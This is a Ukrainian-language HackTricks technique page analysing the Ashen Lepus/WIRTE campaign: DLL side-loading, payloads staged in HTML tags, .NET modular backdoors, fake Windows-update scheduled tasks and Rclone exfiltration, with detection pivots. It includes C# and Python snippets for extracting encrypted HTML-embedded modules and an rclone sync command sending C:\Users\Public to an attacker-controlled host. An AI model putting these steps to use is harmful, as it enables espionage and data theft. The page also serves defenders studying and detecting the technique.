# Поглиблене DLL Side-Loading з HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Огляд методики

Ashen Lepus (aka WIRTE) використовував відтворюваний шаблон, який пов'язує DLL sideloading, staged HTML payloads і модульні .NET backdoors для утримання присутності в дипломатичних мережах Близького Сходу. Техніка придатна для повторного використання будь-яким оператором, оскільки вона базується на:

- **Archive-based social engineering**: невинні PDF-файли підказують цілям завантажити RAR-архів з файлообмінника. Архів містить реалістичний переглядач документів EXE, шкідливу DLL з назвою довіреної бібліотеки (наприклад, `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) та підставний `Document.pdf`.
- **DLL search order abuse**: жертва двічі клацає EXE, Windows розв'язує імпорт DLL з поточного каталогу, і шкідливий лоадер (AshenLoader) виконується всередині довіреного процесу, тоді як підставний PDF відкривається, щоб уникнути підозр.
- **Living-off-the-land staging**: кожен наступний етап (AshenStager → AshenOrchestrator → modules) зберігається поза диском до необхідного моменту і доставляється як зашифровані блоби, сховані всередині інакше нешкідливих HTML-відповідей.

## Багатоступеневий ланцюг Side-Loading

1. **Decoy EXE → AshenLoader**: EXE сайд-лоадить AshenLoader, який проводить host recon, шифрує його AES-CTR і відправляє методом POST всередині змінних параметрів, таких як `token=`, `id=`, `q=` або `auth=`, до шляхів, що виглядають як API (наприклад, `/api/v2/account`).
2. **HTML extraction**: C2 видає наступний етап лише коли IP клієнта геолокалізується в цільовому регіоні і `User-Agent` відповідає імпланту, що ускладнює роботу sandboxes. Коли перевірки проходять, тіло HTTP містить `<headerp>...</headerp>` блоб з Base64/AES-CTR зашифрованим AshenStager payload.
3. **Second sideload**: AshenStager розгортається разом з іншим легітимним бінаром, який імпортує `wtsapi32.dll`. Шкідлива копія, інжектована в бінар, отримує більше HTML, цього разу вирізаючи `<article>...</article>` для відновлення AshenOrchestrator.
4. **AshenOrchestrator**: модульний .NET контролер, який декодує Base64 JSON конфіг. Поля `tg` і `au` конфігу конкатенуються/хешуються в AES key, який розшифровує `xrk`. Отримані байти служать як XOR-ключ для кожного модульного блоба, що завантажується після цього.
5. **Module delivery**: кожний модуль описується через HTML-коментарі, що перенаправляють парсер до довільного тегу, порушуючи статичні правила, які шукають лише `<headerp>` або `<article>`. Модулі включають persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) і file exploration (`FE`).

### Шаблон парсингу HTML-контейнера
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Навіть якщо захисники блокують або видаляють конкретний елемент, оператору потрібно лише змінити тег, підказаний у HTML-коментарі, щоб відновити доставку.

### Швидкий помічник для екстракції (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

Недавні дослідження HTML smuggling (Talos) підкреслюють payloads, приховані як Base64 strings всередині `<script>` блоків у HTML attachments і декодовані через JavaScript під час виконання. Той самий прийом можна повторно використати для C2-відповідей: stage зашифровані бінарні блоки всередині тегу script (або іншого DOM-елемента) і декодувати їх в пам'яті перед AES/XOR, щоб сторінка виглядала як звичайний HTML. Talos також показує багаторівневу обфускацію (перейменування ідентифікаторів плюс Base64/Caesar/AES) всередині script-тегів, що добре відображається на HTML-staged C2 blobs.

## Recent Variant Notes (2024-2025)

- Check Point спостерігав WIRTE кампанії у 2024, які все ще базувалися на archive-based sideloading, але використовували `propsys.dll` (stagerx64) як перший етап. Стейджер декодує наступний payload з Base64 + XOR (key `53`), відправляє HTTP-запити з хардкоденим `User-Agent` і витягує зашифровані бінарні блоки, вставлені між HTML-тегами. В одній гілці stage реконструювався зі довгого списку вбудованих IP-рядків, декодованих через `RtlIpv4StringToAddressA`, які потім конкатенувалися у payload bytes.
- OWN-CERT задокументував раніший WIRTE інструментарій, де side-loaded `wtsapi32.dll` dropper захищав рядки з Base64 + TEA і використовував саме ім'я DLL як ключ для дешифрування, а потім XOR/Base64-обфускував дані ідентифікації хоста перед відправкою на C2.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: поточні loaders вбудовують 256-bit keys плюс nonces (наприклад, `{9a 20 51 98 ...}`) і опційно додають шар XOR, використовуючи рядки типу `msasn1.dll` до/після дешифрування.
- **Key material variations**: ранні loaders використовували Base64 + TEA для захисту вбудованих рядків, з ключем дешифрування, похідним від зловмисного імені DLL (наприклад, `wtsapi32.dll`).
- **Infrastructure split + subdomain camouflage**: staging servers розділені по інструментах, розміщені в різних ASN і іноді прикриваються під легітимні subdomains, тому втрата одного stage не відкриває інші.
- **Recon smuggling**: перераховані дані тепер включають Program Files listings для виявлення цінних додатків і завжди шифруються перед відправкою з хоста.
- **URI churn**: query-параметри і REST-шляхи змінюються між кампаніями (`/api/v1/account?token=` → `/api/v2/account?auth=`), що робить хрупкі детекції неефективними.
- **User-Agent pinning + safe redirects**: C2 інфраструктура відповідає лише на точні UA-рядки і в іншому випадку редиректить на нешкідливі новинні/медичні сайти, щоб злитися з трафіком.
- **Gated delivery**: сервери геофенсовані і відповідають тільки реальним implants. Непогоджені клієнти отримують невикликаючий підозріння HTML.

## Persistence & Execution Loop

AshenStager створює scheduled tasks, що маскуються під Windows maintenance jobs і виконуються через `svchost.exe`, наприклад:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ці завдання перезапускають sideloading chain при завантаженні або через інтервали, забезпечуючи, що AshenOrchestrator може запитувати свіжі модулі без повторного запису на диск.

## Using Benign Sync Clients for Exfiltration

Оператори stage дипломатичні документи в `C:\Users\Public` (доступні для читання всім і не підозрілі) через спеціальний модуль, потім скачують легітимний [Rclone](https://rclone.org/) бінарний файл для синхронізації цієї директорії з attacker storage. Unit42 зауважує, що це перший випадок, коли цей актор використовував Rclone для ексфільтрації, що відповідає ширшій тенденції зловживання легітимними sync tool-ами для змішування з нормальним трафіком:

1. **Stage**: copy/collect target files into `C:\Users\Public\{campaign}\`.
2. **Configure**: ship an Rclone config pointing at an attacker-controlled HTTPS endpoint (e.g., `api.technology-system[.]com`).
3. **Sync**: run `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` так, щоб трафік нагадував звичайні cloud backups.

Оскільки Rclone широко використовується для легітимних резервних копій, захисникам слід фокусуватися на аномальних виконаннях (нові бінарні файли, дивні remotes або раптове синхронізування `C:\Users\Public`).

## Detection Pivots

- Тригери на **signed processes**, які несподівано завантажують DLL з user-writable шляхів (Procmon filters + `Get-ProcessMitigation -Module`), особливо коли імена DLL збігаються з `netutils`, `srvcli`, `dwampi`, або `wtsapi32`.
- Інспектувати підозрілі HTTPS-відповіді на **великі Base64 blobs, вставлені всередині незвичних тегів** або захищені коментарями типу `<!-- TAG: <xyz> -->`.
- Розширити HTML-хантинг до **Base64 рядків всередині `<script>` блоків** (HTML smuggling-style staging), які декодуються через JavaScript перед AES/XOR обробкою.
- Шукати **scheduled tasks**, що запускають `svchost.exe` з нестандартними аргументами або вказують назад на dropper directories.
- Відстежувати **C2 redirects**, які повертають payloads тільки для точних `User-Agent` рядків і в іншому випадку переспрямовують на легітимні новинні/медичні домени.
- Моніторити появу **Rclone** бінарників поза IT-managed локаціями, нових `rclone.conf` файлів або sync job-ів, які тягнуть зі staging директорій типу `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
